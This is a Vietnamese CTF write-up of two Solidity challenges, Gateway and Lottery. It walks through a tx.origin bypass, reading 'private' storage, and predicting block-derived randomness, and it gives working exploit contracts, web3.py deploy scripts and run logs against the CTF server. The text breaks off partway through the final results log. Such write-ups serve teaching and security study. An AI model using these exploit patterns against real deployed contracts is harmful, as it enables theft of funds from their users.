---
title: '[CSSCTF] Blockchain: Gateway & Lottery'
date: '2026-10-02'
description: Writeup tổng hợp các thử thách Blockchain (Gateway & Lottery) trong giải
  đấu CSSCTF.
categories: [CSSCTF, Blockchain]
tags: [cssctf, blockchain, smart-contract, ethereum, web3]
series: [CSSCTF 2026]
showAuthor: false
showTableOfContents: true
---

# CSS CTF — Blockchain: **Gateway** (Phần 1)

> 📄 File này gồm **2 bài blockchain của CSS CTF** (mỗi phần có mục lục/số mục riêng):
> - **Phần 1 — Gateway** (port `31337`) — ngay bên dưới.
> - **Phần 2 — Lottery** (port `31338`) — ở cuối file, bắt đầu tại heading `# CSS CTF — Blockchain: **Lottery**`.


> **Flag:** `CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}`
> (`nc 34.116.80.78 31337` → action `3` trả về `CSS{B451C_BL0CKCH41N_5K1LL5}`)

| | |
|---|---|
| Category | Blockchain (Solidity / EVM) |
| Files | `Gate.sol`, `Setup.sol` |
| Chain | Anvil (foundry) private chain, `chainId = 1`, mỗi EOA được cấp `5000 ETH` |
| Endpoint | `nc 34.116.80.78 31337` — menu `1/2/3`, **ticket = tên team, phân biệt hoa/thường** |
| Kỹ thuật chính | `tx.origin` vs `msg.sender`, `receive()`, storage layout & packing, "private" ≠ bí mật, `keccak256(abi.encodePacked(...))` |

---

## 1. Đề bài

> "The reboot has awakened an abandoned UPDC checkpoint guarding access to the Quantum Nexus
> Network. Its emergency gate still demands three proofs of clearance, but the officers who
> issued them vanished during The Severance. Find your way through all three doors and claim
> the credentials left inside. The ticket is your team name, case-sensitive."

Phần "UPDC checkpoint / Quantum Nexus / The Severance" chỉ là lore. Thứ quyết định là **3 cửa** trong contract.

### `Gate.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Gate {
    address public owner;      // slot 0
    bytes32 private password;  // slot 1
    bool private stepped;      // slot 2
    bool private funded;       // slot 3      <-- COMMENT SAI (xem mục 4.3)
    bool public solved;        // slot 4      <-- COMMENT SAI

    constructor() payable {
        owner = msg.sender;
        password = keccak256(abi.encodePacked("gateway to the flag"));
    }

    /// @notice Door 1: only a contract may pass.
    function enter() external {
        require(tx.origin != msg.sender, "Gate: must be called from a contract");
        stepped = true;
    }

    /// @notice Door 2: pay homage in plain ether.
    receive() external payable {
        require(stepped, "Gate: complete door 1 first");
        require(msg.value > 0, "Gate: send some ether");
        funded = true;
    }

    /// @notice Door 3: speak the password.
    function claim(bytes32 _password) external {
        require(stepped, "Gate: complete door 1 first");
        require(funded, "Gate: complete door 2 first");
        require(_password == password, "Gate: wrong password");
        solved = true;
    }
}
```

### `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import {Gate} from "./Gate.sol";

contract Setup {
    Gate public gate;
    constructor() payable { gate = (new Gate){value: msg.value}(); }
    function isSolved() external view returns (bool) { return gate.solved(); }
}
```

`Setup` chỉ là wrapper: nó deploy `Gate` (gửi kèm `msg.value`) và phơi ra `isSolved()`.
Muốn lấy flag thì `isSolved()` phải trả `true`, tức `gate.solved == true`.

---

## 2. Kiến thức nền (đọc kỹ, đây là toàn bộ độ khó của bài)

### 2.1 `tx.origin` vs `msg.sender`

- `msg.sender`: người **gọi trực tiếp** hàm hiện tại (có thể là EOA hoặc contract).
- `tx.origin`: **EOA khởi tạo cả transaction**. Xuyên suốt mọi lời gọi bên trong nó luôn là EOA đó.

Trong 1 tx `EOA → A → B`:

| | tại `A` | tại `B` |
|---|---|---|
| `msg.sender` | EOA | địa chỉ của `A` |
| `tx.origin` | EOA | EOA |

→ Nếu EOA gọi **trực tiếp** `gate.enter()`: `msg.sender == tx.origin == EOA` → **fail**.
→ Nếu EOA gọi contract `A.pwn()` rồi `A` gọi `gate.enter()`: `msg.sender = A`, `tx.origin = EOA` → **pass**.

Đây là mẫu check chống bot/MEV rất phổ biến và nổi tiếng là **có thể bypass** — nó không chứng minh
người gọi là con người, chỉ chứng minh "được gọi từ một contract". Chính pattern này từng bị lợi dụng
trong các vụ phishing (`tx.origin` phishing).

### 2.2 `receive()` / `fallback()`

- `receive()` chạy khi contract nhận ether **kèm calldata rỗng** (`address(g).call{value:x}("")` hoặc
  chuyển khoản thường).
- Bài này `receive()` **không** kiểm tra `msg.sender`/`tx.origin` → cả EOA cũng gọi được.
  Nó chỉ cần `stepped == true` và `msg.value > 0`.
- Muốn gửi ether **từ bên trong** một contract: không dùng `transfer()` cổ điển mà dùng
  `address(g).call{value: v}("")` (kèm `require(ok)`), vì `transfer` chỉ forward 2300 gas và thường
  sẽ revert khi bên nhận làm việc nhiều. Ở đây `receive()` có `require` + ghi storage nên cần gas thoải mái.

### 2.3 Storage trên EVM — và "private" không hề là bí mật

- Mỗi contract có **storage phẳng gồm các slot 32 byte**, đánh số từ 0.
- Biến kiểu tĩnh (`uintN`, `address`, `bool`, `bytesN`) được xếp **tuần tự**, và compiler **pack nhiều
  biến nhỏ vào cùng một slot** nếu chúng vừa 32 byte. Biến được ghi ở byte **thấp nhất** trước.
- `private`/`internal` chỉ là **visibility ở cấp Solidity**: chặn contract khác truy cập qua ABI, nhưng
  **không mã hoá dữ liệu**. Ai cũng đọc được toàn bộ storage bằng `eth_getStorageAt`. Vì vậy
  `bytes32 private password` = public.

Hệ quả với bài này: `password` vừa **đọc được từ slot 1**, vừa **tự tính được** vì nó là hằng số
`keccak256("gateway to the flag")`. Không có gì gọi là "secret" ở đây cả.

> **Lưu ý về layout: comment trong `Gate.sol` ghi sai slot** — xem mục 4.3, đây là một cái bẫy của đề.

### 2.4 `keccak256(abi.encodePacked(x))` ≠ `keccak256(abi.encode(x))`

- `abi.encodePacked("gateway to the flag")` → **đúng chuỗi byte UTF-8 thô**, không đệm, không length
  prefix. Đây là thứ code dùng:
  `keccak256(abi.encodePacked("gateway to the flag")) = 0x90cd83d75da724f03cbd4c1bd73dbfca4325ab5c4930082484b6f6aa9234d70b`
- `abi.encode("gateway to the flag")` → có offset + length prefix (96 byte) →
  `0xc029662a3a33626014e9e90c7a4098da1afddb31956795559f4a94bb492a6464` — **sai**.

Bản Python tương ứng:

```python
from eth_utils import keccak
pw = keccak(text="gateway to the flag")            # == encodePacked
# pw.hex() = 90cd83d75da724f03cbd4c1bd73dbfca4325ab5c4930082484b6f6aa9234d70b
```

### 2.5 Môi trường

Server là **anvil** (`web3_clientVersion` → `anvil/v1.8.3`): auto-mine mỗi tx, không cần chờ block,
mỗi instance có EOA riêng với 5000 ETH — nên gas/fee hầu như không phải vấn đề, thoải mái gọi nhiều tx.
Instance **tự huỷ sau 30 phút**.

---

## 3. Phân tích: 3 cửa và cách qua

| Cửa | Hàm | Điều kiện | Cách qua |
|---|---|---|---|
| 1 | `enter()` | `tx.origin != msg.sender` | Gọi **từ một contract** của mình |
| 2 | `receive()` | `stepped == true` **và** `msg.value > 0` | Gửi **≥ 1 wei** vào địa chỉ Gate |
| 3 | `claim(bytes32)` | `stepped` && `funded` && `_password == password` | Gửi `keccak256("gateway to the flag")` |

**Điểm mấu chốt thứ nhất:** chỉ **cửa 1** yêu cầu contract. `receive()` và `claim()` **không hề** có
check `msg.sender`/`tx.origin`. Nghĩa là đường đi tối thiểu chỉ cần **một** contract bé xíu để mở cửa 1,
còn cửa 2 và 3 EOA tự làm.

**Điểm mấu chốt thứ hai:** thứ tự bắt buộc
`enter()` → gửi ether → `claim()`. Nếu gửi ether trước, `receive()` revert vì `stepped == false`.

**Điểm mấu chốt thứ ba:** `password` không cần "bẻ khoá" gì cả — hardcode + `private` vẫn lộ.

---

## 4. Recon thực tế (đã chạy)

### 4.1 Lấy instance

```
$ nc 34.116.80.78 31337
1 - launch new instance
2 - kill instance
3 - get flag
action? 1
ticket please: <TÊN TEAM, case-sensitive>

your private blockchain has been deployed
it will automatically terminate in 30 minutes
here's some useful information
uuid:           ...
rpc endpoint:   http://34.116.80.78:8545/<uuid>
private key:    0x...
setup contract: 0x...
```

Script `gate_launch.py` (socket thuần) tự động hoá: nếu server báo `An instance is already running!`
thì nó chọn `2` để kill trước rồi mới `1` để launch, sau đó regex ra `uuid / rpc / private key / setup`
và lưu `/tmp/gate_cfg.json`.

### 4.2 Đọc state on-chain

```
[*] ticket : TEST
[*] eoa    : 0x216d284eFC6b1565f62456b5a2f927f142cbD43E 5000 ETH
[*] setup  : 0x6DeF799dAfcc890a883feba3A90B3A827a614795
[*] gate   : 0x408c3d68178299094a768f03957E37EAdb1583F0     <- Setup.gate()
    slot 0 (owner                 ) = 0x...6def799dafcc890a883feba3a90b3a827a614795   (chính Setup!)
    slot 1 (password              ) = 0x90cd83d7...9234d70b
    slot 2 (stepped|funded|solved ) = 0x0000...0000
    slot 3, slot 4                 = 0x0000...0000 | 0x0000...0000  (RỖNG)
    keccak256(abi.encodePacked('gateway to the flag')) = 0x90cd83d7...9234d70b
    slot1 == password ? True
    isSolved()        = False
```

→ Contract deploy **đúng như source**, và password đúng như ta tính. (Nếu slot 1 không khớp thì phải
nghi ngờ source đã bị "đổi bài" ở server — ở đây thì không.)

### 4.3 ⚠ Bẫy: comment trong source ghi SAI slot

`Gate.sol` ghi:

```solidity
bool private stepped;      // slot 2
bool private funded;       // slot 3
bool public  solved;       // slot 4
```

Nhưng Solidity **pack** các biến nhỏ liên tiếp vào cùng một slot. Hỏi thẳng compiler:

```bash
# solcjs CLI không có cờ --storage-layout -> phải đưa standard-json vào stdin
python3 - <<'EOF' > /tmp/stdin.json
import json
print(json.dumps({
  "language": "Solidity",
  "sources": {"Gate.sol": {"content": open("Gate.sol").read()}},
  "settings": {"optimizer": {"enabled": True, "runs": 200},
               "outputSelection": {"*": {"*": ["storageLayout", "abi", "evm.bytecode.object"]}}}
}))
EOF
solcjs --standard-json < /tmp/stdin.json \
  | python3 -c 'import json,sys; print(json.dumps(json.load(sys.stdin)["contracts"]["Gate.sol"]["Gate"]["storageLayout"]["storage"], indent=1))'
```

```json
[ { "label": "owner",    "slot": "0", "offset": 0, "type": "t_address" },
  { "label": "password", "slot": "1", "offset": 0, "type": "t_bytes32" },
  { "label": "stepped",  "slot": "2", "offset": 0, "type": "t_bool" },
  { "label": "funded",   "slot": "2", "offset": 1, "type": "t_bool" },
  { "label": "solved",   "slot": "2", "offset": 2, "type": "t_bool" } ]
```

**Cả `stepped`, `funded`, `solved` nằm chung slot 2** ở offset 0 / 1 / 2 → slot 3 và slot 4 **rỗng vĩnh viễn**.
Bằng chứng on-chain sau khi giải (slot 2 đi từng bước):

```
trước khi làm gì   slot2 = 0x0000000000000000000000000000000000000000000000000000000000000000
sau enter()        slot2 = 0x...01            (stepped)
sau khi gửi 1 wei  slot2 = 0x...0101          (stepped + funded)
sau claim()        slot2 = 0x...010101        (stepped + funded + solved)   <-- isSolved() = True
```

Ai cứ tin comment mà `eth_getStorageAt(gate, 4)` để check `solved` sẽ thấy **luôn bằng 0** và tưởng mình
chưa giải được. Cách đúng: đọc slot 2 rồi tách bit `(w >> 0) & 1` (stepped), `(w >> 8) & 1` (funded),
`(w >> 16) & 1` (solved) — hoặc đơn giản là gọi `Setup.isSolved()`.

---

## 5. Khai thác

### 5.1 Đường A — một transaction ăn cả 3 cửa

`GateAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IGate {
    function enter() external;
    function claim(bytes32 _password) external;
}

contract GateAttack {
    IGate immutable gate;
    constructor(address g) { gate = IGate(g); }

    function pwn(bytes32 pw) external payable {
        gate.enter();                                            // door 1
        (bool ok, ) = address(gate).call{value: msg.value}("");  // door 2 (receive())
        require(ok, "gate: fund failed");
        gate.claim(pw);                                          // door 3
    }

    receive() external payable {}
}
```

Vì sao qua được cửa 1: trong `pwn()` ta đang chạy **bên trong `GateAttack`**, nên khi nó gọi
`gate.enter()` thì `msg.sender = GateAttack`, còn `tx.origin = EOA ví của mình` → `tx.origin != msg.sender` → pass.

Compile:

```bash
solcjs --abi --bin --optimize --base-path . -o out_gate \
       Gate.sol Setup.sol GateAttack.sol GateEnter.sol
```

Deploy + bắn (`gate_solve.py`, web3.py v8):

```python
atk_factory = w3.eth.contract(abi=atk_abi, bytecode=atk_bin)
rc = send(atk_factory.constructor(GATE).build_transaction({"from": acct.address, "value": 0}))
atk = w3.eth.contract(address=rc.contractAddress, abi=atk_abi)
rc = send(atk.functions.pwn(pw).build_transaction({"from": acct.address, "value": 1}))  # 1 wei
```

Kết quả thật:

```
[A] deploy GateAttack roi goi pwn()  (1 tx: cua 1 + 2 + 3)
    GateAttack : 0x498c264d4d1f4C3AaA2478085469eB72b0d5303d | deploy gas 174601
    pwn() tx   : 0x1b415a2c8651a8b69f48040821212407a8664676c204289ff7e04d1c69f1dc26 | gas 58053
    isSolved() : True
```

### 5.2 Đường B — tối giản: chỉ cửa 1 cần contract, cửa 2 + 3 EOA tự làm

`GateEnter.sol`:

```solidity
contract GateEnter {
    function open(address g) external { IGateEnter(g).enter(); }
}
```

Rồi:

1. `GateEnter.open(gate)` — tx từ EOA, `msg.sender` trong `enter()` = `GateEnter` → qua cửa 1.
2. EOA chuyển thẳng **1 wei** tới địa chỉ Gate (`{"to": gate, "value": 1}`) → `receive()` chạy, `funded = true`.
   (không cần contract, vì `receive()` không check ai gửi)
3. EOA gọi `gate.claim(pw)` → `solved = true`.

Đã verify trên **một `Setup` mới tự deploy** (để chứng minh từ state sạch):

```
[B] fresh Setup: 0x499351b42b91B60Fd19d2371FF99D8efB4e83940 | fresh Gate: 0x9b12A3765ae3d7D765351137D9E6BAf429384198
    cua 1: contract.enter()  gas 46858 | slot2 = 0x1     -> stepped = 1
    cua 2: EOA gui 1 wei     gas 26223 | slot2 = 0x101   -> funded  = 1
    cua 3: EOA claim(pw)     gas 29223
    slot2 sau cung = 0x10101 -> solved = 1
    fresh Setup isSolved() = True
```

→ Cả hai đường đều đúng, và đường B cho thấy đề bài chỉ thực sự "khoá" đúng **một** cửa.

---

## 6. Lấy flag

Sau khi `isSolved() == true`:

```bash
$ printf '3\nTEST\n' | nc 34.116.80.78 31337
1 - launch new instance
2 - kill instance
3 - get flag
action? ticket please: CSS{B451C_BL0CKCH41N_5K1LL5}
```

Flag nộp:

```
CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}
```

---

## 7. Bẫy / lỗi hay gặp & bài học

**Bẫy của đề**

1. **Comment slot trong `Gate.sol` ghi sai** — `funded`/`solved` thực tế nằm chung slot 2 với `stepped`
   (0x01 → 0x0101 → 0x010101). Tin comment là mất thời gian.
2. **Tên challenge/lore "UPDC checkpoint"** gợi ý mấy thứ không tồn tại; source không có gì khác ngoài 3 cửa.
3. **Cửa 1 khiến bạn tưởng phải "làm contract" cho cả bài** — thực ra chỉ cần cho cửa 1.
4. `password` là `private` → nhiều người loay hoay tìm cách "đọc biến private", trong khi nó vừa tự tính được,
   vừa đọc được bằng `eth_getStorageAt(gate, 1)`.

**Bài học chung**

- Đừng bao giờ để secret (mật khẩu, seed, đáp án) ở dạng plaintext/`keccak` **hardcode on-chain**;
  mọi storage đều public. Muốn "ẩn" thì phải dùng commit-reveal, chữ ký, hoặc dữ liệu off-chain.
- `tx.origin` **không** phải cơ chế phân biệt người/contract an toàn — luôn dùng `msg.sender`.
- `private` trong Solidity = "không có getter", **không phải** "bí mật".
- Đừng tin comment về storage layout; hỏi compiler (`storageLayout`) hoặc kiểm tra on-chain.
- Đọc kỹ **từng** `require` để biết cửa nào thực sự bị chặn: ở đây chỉ `enter()` có check.

**Lỗi kỹ thuật khi viết script (đã gặp và sửa)**

- `web3.py v8`: `HexBytes.hex()` trả về **không** có tiền tố `0x` → đừng so sánh với `"0x" + ...`.
- `build_transaction()` cần `{"from": ...}` (nếu không web3 không estimate gas được).
- Tx tự dựng tay (không qua `build_transaction`) phải tự điền `gasPrice` (legacy) hoặc `maxFeePerGas`, nếu không
  `eth_account` báo `Transaction must include these fields: {'gasPrice'}`.
- `gate.functions.stepped()` / `.funded()` **không tồn tại** (biến `private` không có auto-getter) → phải đọc storage.
- `solcjs` CLI **không** có cờ `--storage-layout` → phải dùng `--standard-json` với `outputSelection`.
- Server chỉ cho **1 instance / ticket**: gặp `An instance is already running!` thì phải chọn `2` (kill) trước.
- Instance **huỷ sau 30 phút**; job phải xong trong khoảng đó (bài này cả recon + 2 đường khai thác < 1 phút).

---

## 8. Phụ lục — file & lệnh tái lập

```
Downloads/CSSCTF/BLOCKCHAIN/
├── Gate.sol            # đề cho
├── Setup.sol           # đề cho
├── GateAttack.sol      # exploit đường A (1 tx, 3 cửa)
├── GateEnter.sol       # exploit đường B (chỉ mở cửa 1)
├── gate_launch.py      # nc: kill+launch instance, parse rpc/pk/setup -> /tmp/gate_cfg.json
├── gate_solve.py       # recon storage + khai thác (A và B) + assert isSolved()
└── out_gate/           # abi/bin sau khi compile (solcjs)
```

```bash
# 1) môi trường
python3 -m venv ~/.venvs/ctf && ~/.venvs/ctf/bin/pip install web3
npm i -g solc                                        # -> solcjs

# 2) compile
cd ~/Downloads/CSSCTF/BLOCKCHAIN
solcjs --abi --bin --optimize --base-path . -o out_gate \
       Gate.sol Setup.sol GateAttack.sol GateEnter.sol

# 3) lấy instance (ticket = tên team, case-sensitive)
~/.venvs/ctf/bin/python gate_launch.py "<TEN_TEAM>"

# 4) khai thác + verify
~/.venvs/ctf/bin/python gate_solve.py

# 5) lấy flag
printf '3\n<TEN_TEAM>\n' | nc 34.116.80.78 31337
```

**Tóm tắt 1 câu:** `password` hardcode + `private` → đọc/tính được; `tx.origin != msg.sender` → bypass bằng
một contract tự viết; `receive()` không kiểm tra người gửi → EOA gửi 1 wei là xong; cộng thêm comment
storage sai slot để dụ người chơi đọc nhầm slot.

---

# CSS CTF — Blockchain: **Lottery**

> **Flag:** `CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}`
> (`nc 34.116.80.78 31338` → action `3` trả về `CSS{U5E_4_R4ND0M_FUNCT10N}`)

| | |
|---|---|
| Category | Blockchain (Solidity / EVM) |
| Files | `Lottery.sol`, `Setup.sol` (file đề cho tên `Setup(1).sol`) |
| Chain | Anvil **v1.8.3**, `chainId = 1`, mỗi EOA được cấp `5000 ETH` |
| Endpoint | `nc 34.116.80.78 31338` — menu `1/2/3`, **ticket = tên team, phân biệt hoa/thường** |
| Điều kiện thắng | `Setup.isSolved() == true`, tức `lottery.winner() != address(0)` |
| Kỹ thuật chính | randomness sinh từ **dữ liệu block** (`blockhash` / `block.timestamp` / `block.difficulty`≡`prevrandao`) → tính lại được **trong cùng transaction** bằng một contract tự viết |
| Xác suất đoán mò | `(1/100)^10 = 10⁻²⁰` → bất khả thi, buộc phải "nhìn thấy" đáp án |

---

## 1. Đề bài

> "Beyond the checkpoint, a Beltway Bandits gambling terminal has resumed broadcasting:
> *Ten wins in a row. One fortune. No second chances.* Once used to distribute stolen credits,
> it now holds an access key to the Bandits' hidden network. Beat the house and claim it before
> they return to collect. The ticket is your team name, case-sensitive."

Lore chỉ để dẫn chuyện; bài toán thật nằm ở một câu duy nhất trong đề: **thắng 10 lần liên tiếp**.

### `Lottery.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Lottery {
    uint256 public constant STREAK_TO_WIN = 10;

    mapping(address => uint256) public streaks;
    address public winner;

    event Guessed(address indexed guesser, uint256 target, bool correct);

    /// @notice A totally random number, sourced from the blockchain itself.
    function random() public view returns (uint256) {
        return uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp,
                    block.difficulty
                )
            )
        );
    }

    function guess(uint256 _guess) external {
        uint256 target = random() % 100;
        bool correct = _guess == target;

        if (correct) {
            streaks[msg.sender] += 1;
            if (streaks[msg.sender] >= STREAK_TO_WIN) {
                winner = msg.sender;
            }
        } else {
            streaks[msg.sender] = 0;   // sai 1 lần là mất hết chuỗi
        }

        emit Guessed(msg.sender, target, correct);
    }
}
```

### `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import {Lottery} from "./Lottery.sol";

contract Setup {
    Lottery public lottery;

    constructor() { lottery = new Lottery(); }

    function isSolved() external view returns (bool) {
        return lottery.winner() != address(0);
    }
}
```

Không có `require()` nào, không có `tx.origin`, không có storage bí mật. Toàn bộ độ khó nằm ở chỗ:
**làm sao đoán đúng `random() % 100` mười lần liên tiếp.**

Ba biến mà đề bài tự nhận là "totally random":

| Thành phần | Ý nghĩa thật |
|---|---|
| `blockhash(block.number - 1)` | hash của block **liền trước** (hợp lệ trong 256 block gần nhất) |
| `block.timestamp` | timestamp của block **đang chạy** |
| `block.difficulty` | từ bản Paris trở đi opcode `DIFFICULTY` trở thành `PREVRANDAO` → trả về **`prevrandao` = `mixHash` của block đang chạy** |

Cả ba đều là **hằng số đối với mọi lời gọi nằm trong cùng một block**. Đó chính là lỗ hổng.

---

## 2. Kiến thức nền (đây là toàn bộ lời giải)

### 2.1 "Randomness từ block" không hề ngẫu nhiên với một contract

Trong 1 transaction:

```
EOA ──tx──► Lottery.guess(65)
              └─ target = keccak256(blockhash(n-1) ‖ block.timestamp ‖ prevrandao) % 100
```

Toàn bộ dữ liệu đầu vào đã **cố định ngay khi block được tạo**. Nếu một contract **tự tính lại đúng
biểu thức đó trong cùng transaction**, nó luôn nhận được **đúng** con số mà `guess()` sắp so sánh.
Nói cách khác: đáp án nằm ngay trong tay người chơi, chỉ là EOA "không nhìn thấy" được — còn **contract thì nhìn thấy**.

### 2.2 EOA thì không nhìn thấy — nhưng vì sao?

Khi bạn ký một tx từ EOA, bạn phải điền `to/data/value` **trước khi** block chứa nó tồn tại. Timestamp và
`prevrandao` của block tương lai chưa biết ⇒ không thể tính trước `target`. Thêm nữa, mỗi tx đều bị đẩy
vào một block mới (automine của anvil: 1 tx = 1 block) nên `blockhash(n-1)`, `block.timestamp`,
`prevrandao` **khác hoàn toàn** so với block bạn dùng để tính.

**Đã kiểm chứng bằng thí nghiệm thật** (mục 5): tính `guess` từ dữ liệu block head rồi gửi bằng EOA ⇒
đoán `79`, target thật `74`, `correct = false`, streak bị reset về `0`.

Hệ quả quan trọng: **cơ chế "10 lần liên tiếp" chỉ chặn được EOA, không chặn được contract.**
Contract có thể gọi `guess()` **10 lần trong cùng 1 transaction**; cả 10 lời gọi nằm cùng block ⇒
`random()` trả về **cùng một giá trị** ⇒ 10/10 đúng.

### 2.3 `abi.encodePacked(a, b, c)` hoạt động ra sao

`encodePacked` **nối raw bytes, không padding**. Vì `blockhash()` là `bytes32`, `uint256` timestamp và
`uint256` difficulty đều đúng 32 byte, nên kết quả là **96 byte** = `parentHash ‖ ts ‖ prevrandao`:

```python
from eth_utils import keccak

def random_of_block(parent_hash: bytes, ts: int, prevrandao: int) -> int:
    packed  = parent_hash + ts.to_bytes(32, "big") + prevrandao.to_bytes(32, "big")
    return int.from_bytes(keccak(packed), "big")

def target_of_block(parent_hash: bytes, ts: int, prevrandao: int) -> int:
    return random_of_block(parent_hash, ts, prevrandao) % 100
```

> ⚠️ Đây chính là công thức để **verify offline** sau này: lấy block chứa tx, `parent_hash` = hash của
> block `n-1` (không phải hash của block `n`), `ts` = timestamp block `n`, `prevrandao` = **`mixHash`**
> của block `n`. Đừng dùng field `difficulty` mà RPC trả về — xem 2.4.

### 2.4 `block.difficulty` trên EVM **không** phải field `difficulty` của RPC

Sau The Merge, opcode `DIFFICULTY` (0x44) đổi tên thành `PREVRANDAO`. Compiler ≥ `paris` phát cảnh báo:

```
Warning: Since the VM version paris, "difficulty" was replaced by "prevrandao",
which now returns a random number based on the beacon chain.
```

Đo được trên instance thật (contract `Probe.sol` gọi `block.difficulty` bằng `eth_call`):

```
[evm view] block.number = 26101558   ts = 1790907009
           block.difficulty = 16309442122959647568758956656505451332577619934104229964068948587686416544685
           blockhash(block.number-1) = 0xd6a5c04d... (= hash của block 26101557, tức parent)
[head RPC] number 26101558  ts 1790907009  field difficulty = 0  mixHash = 0x240ed12e...
=> block.difficulty == head.mixHash  ->  True
=> block.difficulty == head.difficulty (field RPC)  ->  False
```

Kết luận: **giá trị mà contract nhìn thấy = `mixHash` (prevrandao) của block**, còn field `difficulty`
trong `eth_getBlockByNumber` là `0`/rác → nếu dùng nó để tính lại offline sẽ ra sai (đã thấy: tính ra `68`
trong khi target thật là `74`).

### 2.5 Chuỗi 10 lần trong 1 tx — tại sao hợp lệ

```solidity
for (uint256 i = 0; i < 10; i++) { lottery.guess(roll()); }
```

10 lời gọi **internal message call** này chạy trong **cùng một transaction, cùng một block** ⇒
`random()` không đổi ⇒ target không đổi (log thật: cả 10 lần đều `target = 65`). Vậy chỉ cần đúng **một**
phép tính, không cần 10 phép tính khác nhau. Đây là điểm nhiều người tưởng sai: *"10 lần liên tiếp thì phải
đoán 10 số khác nhau"* — không, chỉ cần một số, miễn là cả 10 lần nằm chung block.

---

## 3. Recon instance (làm trước khi viết exploit)

```bash
$ printf '1\n<TOKEN_TEAM>\n' | nc 34.116.80.78 31338
1 - launch new instance
2 - kill instance
3 - get flag
action? ticket please:
your private blockchain has been deployed
it will automatically terminate in 30 minutes
here's some useful information
uuid:           f3ff3e06-125b-4820-987f-8ee6603470ad
rpc endpoint:   http://34.116.80.78:8546/f3ff3e06-125b-4820-987f-8ee6603470ad
private key:    0xbf44b708...04ff09
setup contract: 0xa7698A8397B10220d2A71EC85169f2f766CEeeA5
```

Ba việc phải làm bằng code, **không gõ tay**:

1. **Parse** `rpc / private key / setup` bằng regex vào `lot_cfg.json`
   (private key dài 66 ký tự; gõ tay một nibble sai là mất cả instance).
2. `eth_chainId` / `eth_blockNumber` để chắc endpoint sống, rồi `setup.lottery()` để lấy địa chỉ Lottery.
3. Đối chiếu bytecode on-chain với bản compile từ source đề cho (ở đây khớp: `Setup` 726 byte code,
   `Lottery` 1642 byte code, `isSolved()` trả `false` khi chưa giải).

```python
setup = w3.eth.contract(address=SETUP, abi=SETUP_ABI)
lot_addr = setup.functions.lottery().call()
lot = w3.eth.contract(address=lot_addr, abi=LOT_ABI)
print(setup.functions.isSolved().call())        # False
print(lot.functions.streaks(me).call())         # 0
print(lot.functions.winner().call())            # 0x0000...0000
```

---

## 4. Khai thác — Đường A: tự tính lại `keccak`

`Attack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ILottery {
    function guess(uint256 _guess) external;
}

contract Attack {
    ILottery public lottery;

    constructor(address _lottery) { lottery = ILottery(_lottery); }

    // y hệt Lottery.random(), chạy trong cùng block -> cùng kết quả
    function roll() internal view returns (uint256) {
        return uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp,
                    block.difficulty
                )
            )
        ) % 100;
    }

    function pwn() external {
        for (uint256 i = 0; i < 10; i++) {
            lottery.guess(roll());
        }
    }
}
```

Giải thích từng điểm:

- `roll()` **phải là `view`** — nó không ghi state, chỉ đọc block context; gas rẻ (không SLOAD/SSTORE).
- Thứ tự và kiểu trong `abi.encodePacked` **phải trùng khít**: `bytes32, uint256, uint256`. Sai kiểu
  (ví dụ `uint8(block.timestamp)`) là ra hash khác → đoán sai ngay.
- `% 100` làm trước khi truyền vào `guess()` để khớp `target = random() % 100`.
- Vì `Lottery.guess()` là hàm `external`, `Attack` gọi nó bằng `CALL` thường (không `delegatecall`) —
  `msg.sender` trong `Lottery` là **địa chỉ `Attack`**, nên streak được ghi cho `Attack`, và `winner`
  sẽ là `Attack` ⇒ `winner != address(0)` ⇒ `isSolved() == true`. Không cần `tx.origin` gì cả.
- `pwn()` là `external` (không `payable` cần thiết, vì `Lottery` không đòi ether).

Compile:

```bash
solcjs --abi --bin --optimize -o out Attack.sol
# out/Attack_sol_Attack.abi , out/Attack_sol_Attack.bin
```

Deploy + bắn (web3.py v8):

```python
ATK = w3.eth.contract(abi=atk_abi, bytecode=atk_bin)
rc  = send(ATK.constructor(lot_addr).build_transaction({"from": acct.address}))
atk = w3.eth.contract(address=rc.contractAddress, abi=atk_abi)
rc  = send(atk.functions.pwn().build_transaction({"from": acct.address}))
assert rc.status == 1                    # revert là vô hình nếu không check
```

---

## 5. Khai thác — Đường B: gọi thẳng `lottery.random()`

Ngắn hơn nữa: `random()` là `public view` ⇒ contract tấn công **gọi luôn hàm của nạn nhân** làm oracle.

```solidity
interface ILotteryView {
    function random() external view returns (uint256);
    function guess(uint256 _guess) external;
}

contract AttackAlt {
    ILotteryView immutable lot;
    constructor(address _lot) { lot = ILotteryView(_lot); }

    function pwn() external {
        for (uint256 i = 0; i < 10; i++) {
            lot.guess(lot.random() % 100);   // hỏi chính "nhà cái" đáp án rồi đặt cược
        }
    }
}
```

Cùng lý do: `lot.random()` chạy trong cùng tx ⇒ trả đúng giá trị `guess()` sắp dùng.

### Thí nghiệm chứng minh EOA **không** làm được (chạy thật, đường A/B ở trên là contract)

```
[evm] đoán 79 từ (headhash, head_ts+1, head_difficulty_field) rồi gửi guess() bằng EOA
  guess tx status 1, block 26101562, ts = parent_ts + 7
  event Guessed -> guesser <EOA>  target 74  correct False
  streak EOA: 0

[verify offline block đó]
  recompute(parent_hash, ts, prevrandao)   = 74   ✅ khớp event
  recompute(parent_hash, ts, difficulty)   = 68   ❌ (field difficulty của RPC là rác)
```

Ngoài ra, delta timestamp các block liên tiếp trong instance này: `+5s, +3s, +3s, +7s` → **không đoán được**
⇒ kể cả biết `prevrandao` cũng không suy ra được timestamp. Vậy con đường "tính trước rồi gửi từ ví" là ngõ cụt.

---

## 6. Kết quả chạy thật (instance `f3ff3e06-...`)

```
rpc .../f3ff3e06-125b-4820-987f-8ee6603470ad
chainId 1 client anvil/v1.8.3 block 26101562
me 0xF9C67bf736c4b5c5F6b4De5478361E75D3D66eBA balance 4999.999829106 ETH
